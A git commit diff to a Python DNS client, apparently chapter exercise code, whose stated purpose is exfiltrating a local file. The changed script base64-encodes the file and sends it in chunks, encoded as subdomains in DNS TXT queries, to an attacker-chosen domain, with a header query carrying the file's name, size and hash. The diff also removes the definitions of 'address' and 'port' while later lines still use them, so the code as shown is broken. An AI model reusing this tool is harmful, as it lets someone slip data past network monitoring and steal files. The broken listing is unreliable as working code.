4fc913d78226655c205b3b57d16d211a27d49529
freedomfred <freedomfred@gmail.com>
2019-08-05 21:21:03 -0700

    fixed args

--- Ch3/DNSClient.py
+++ Ch3/DNSClient.py
@@ -1,34 +1,36 @@
 
 import socket
 import dnslib
-import argparse,sys,time
+import argparse,sys,time, os
 import base64
 from hashlib import md5
 
 
 
 
-def tcp_dns_record(host, qtype, server,tcp):
+def tcp_dns_record(ns,host, qtype, server,tcp):
 
     if isinstance(qtype, str):
         query = dnslib.DNSRecord.question(host, qtype=qtype)
     else:
         query = dnslib.DNSRecord(q=dnslib.DNSQuestion(host, qtype))
     query_data = query.pack()
-    record = query.send(server,tcp=tcp)
+    #print("sending:",ns, host,qtype,ns,tcp,query_data)
+    record = query.send(ns,tcp=tcp)
+    #print("response:",record)
     return record
 
 def chunkstring(string, length):
     return (string[0+i:length+i] for i in range(0, len(string), length))
 
-def progress(count, total, status=''):
-    bar_len = 60
-    filled_len = int(round(bar_len * count / float(total)))
+def progressBar(c, tot, status):
+    bar = 40
+    filled = int(round(bar * c / float(tot)))
 
-    percents = round(100.0 * count / float(total), 1)
-    bar = '=' * filled_len + '-' * (bar_len - filled_len)
+    pct = round(100.0 * c / float(tot), 1)
+    barstr = '=' * filled + '-' * (bar - filled)
 
-    sys.stdout.write('[%s] %s%s ...%s\r' % (bar, percents, '%', status))
+    sys.stdout.write('[%s] %s%s ...%s\r' % (barstr, pct, '%', status))
     sys.stdout.flush()
 
 if __name__ == "__main__":
@@ -37,36 +39,56 @@ if __name__ == "__main__":
     p = argparse.ArgumentParser(description="DNS Client")
     p.add_argument("--file","-f",
                     help="local file you want to exfiltrate", required = True)
-    p.add_argument("--server","-s",default="8.8.8.8",
+    p.add_argument("--domain","-d",
+                    metavar="<ip_address|fqdn>",
+                    help="target domain or ip address of your dns server")
+    p.add_argument("--nameserver","-ns",default="8.8.8.8",
                     metavar="<address:port>",
-                    help="Server address:port (default:8.8.8.8:53) (port is optional)")
+                    help="Name Server address:port (default:8.8.8.8:53) (port is optional)")
+                    
     p.add_argument("--tcp",action='store_true',default=False,
                     help="Use TCP (default: UDP)")
     
     args = p.parse_args()
 
-    address,_,port = args.server.partition(':')
-    port = str(port or 53)
+    
 
+    
     f = open(args.file, 'rb') 
     content = f.read() 
-    hashedWord = md5(content).hexdigest()
-    #print(hashedWord, md5(content))
-    content_encoded = base64.standard_b64encode(content)
-    chunked_content = chunkstring(content_encoded,63)
-    #print("Sending file "+args.file+ " to "+address+":"+port)
     
-    tcp_dns_record(args.file+"|"+str(len(content_encoded))+"|"+hashedWord, dnslib.QTYPE.TXT,address,args.tcp)
-    #print(content_encoded)
+    hashedWord = md5(content).hexdigest()
+
+    content_encoded = base64.standard_b64encode(content)
+
+    #Cut the string into an array of strings of 63 characters or less
+    chunked_content = chunkstring(content_encoded,63-15)
+    
+    #Send the header query
+
+    #print("tcp:",args.tcp, "address:",address)
+    tcp_dns_record(args.nameserver,os.path.basename(args.file)+"|"+str(len(content_encoded))+"|"+hashedWord+"."+args.domain, dnslib.QTYPE.TXT,address,args.tcp)
+    
     count =0 
+    #print (len(content_encoded))
+    done = ""
     for chunk in chunked_content:
         count +=len(chunk)
-        progress(count, len(content_encoded), status="Sending file "+args.file+ " to "+address+":"+port)
-        tcp_dns_record(chunk, dnslib.QTYPE.TXT,address,args.tcp)
+        chunk = chunk.decode('utf-8')
+        #print(chunk, count)
+        progressBar(count, len(content_encoded), status="Sending file "+args.file+ " to "+address+":"+port)
+        
+        r = tcp_dns_record(args.nameserver,hashedWord[:4]+chunk+"."+args.domain, dnslib.QTYPE.TXT,address,args.tcp)
+        
+        resp = dnslib.DNSRecord.parse(r)
+        if len(resp.rr)==2:
+            done = str(resp.rr[1].rdata)
+        status = str(resp.rr[0].rdata)
+        if (status[1:-1]!=chunk):
+            print("ERROR -  chunks different: ", status,chunk)
 
-    print("File sent")
+    print("File sent: ",done)
 
     
-    
-    #
+
 
